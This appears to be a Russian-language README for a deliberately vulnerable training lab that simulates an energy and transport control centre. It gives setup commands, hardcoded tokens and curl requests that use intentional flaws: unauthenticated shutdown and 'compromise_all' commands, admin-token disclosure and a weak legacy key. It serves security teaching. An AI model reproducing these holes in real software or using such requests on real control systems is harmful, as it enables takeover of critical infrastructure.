# Инструкции по запуску Оперативного Центра Энергетики и Транспорта

## Быстрый старт

### 1. Запуск системы
```bash
./start_system.sh
```

### 2. Остановка системы
```bash
./stop_system.sh
```

## Доступ к системе

- **Веб-интерфейс**: http://localhost:5557
- **API Token**: `changeme_local_token_please_change`
- **Admin Token**: `super_secret_admin_token_123`

## Уязвимости для изучения

### 1. Отсутствие авторизации в админ-панели
```bash
# Прямой доступ к критическим командам без авторизации
curl "http://localhost:5557/api/management/control?cmd=shutdown"
curl "http://localhost:5557/api/management/control?cmd=isolate"
curl "http://localhost:5557/api/management/control?cmd=compromise_all"
```

### 2. Получение админ-ключа без авторизации
```bash
# Получение админ-ключа без проверки прав
curl "http://localhost:5557/api/management/token"
```

### 3. Использование слабого legacy-ключа
```bash
# Использование известного слабого ключа
curl -X POST "http://localhost:5557/api/legacy_control" \
  -H "Content-Type: application/json" \
  -d '{"device_id": "pp-1", "legacy_key": "weak-legacy-key-for-lab"}'
```

### 4. Подтверждение наличия API
```bash
# Подтверждение что API существует (не раскрывает структуру)
curl "http://localhost:5557/api"
```

## Управление системой

### Просмотр логов
```bash
docker-compose logs -f
```

### Проверка статуса
```bash
docker-compose ps
```

### Полная очистка
```bash
docker-compose down --volumes --remove-orphans
```

## Структура проекта

- `app/` - исходный код приложения
- `docker-compose.yaml` - конфигурация Docker Compose
- `Dockerfile` - образ приложения
- `start_system.sh` - скрипт запуска
- `stop_system.sh` - скрипт остановки
- `env.example` - пример конфигурации
- `.env` - файл конфигурации (создается автоматически)

## Безопасность

⚠️ **ВНИМАНИЕ**: Данная система содержит намеренные уязвимости для обучения. 
НЕ используйте этот код в продакшене!

## API Endpoints

- `GET /` - главная страница
- `GET /api` - подтверждение наличия API (не раскрывает структуру)
- `GET /api/devices` - список устройств
- `GET /api/management/control?cmd=<command>` - критические команды (уязвимость)
- `GET /api/management/token` - получение админ-ключа (уязвимость)
- `POST /api/legacy_control` - legacy API (уязвимость)
- `POST /api/command` - обычные команды (требует авторизацию)
- `GET /health` - проверка состояния системы

## Заблокированные эндпоинты

- `GET /docs` - документация FastAPI (заблокирована)
- `GET /openapi.json` - OpenAPI схема (заблокирована)
- `GET /redoc` - ReDoc документация (заблокирована)
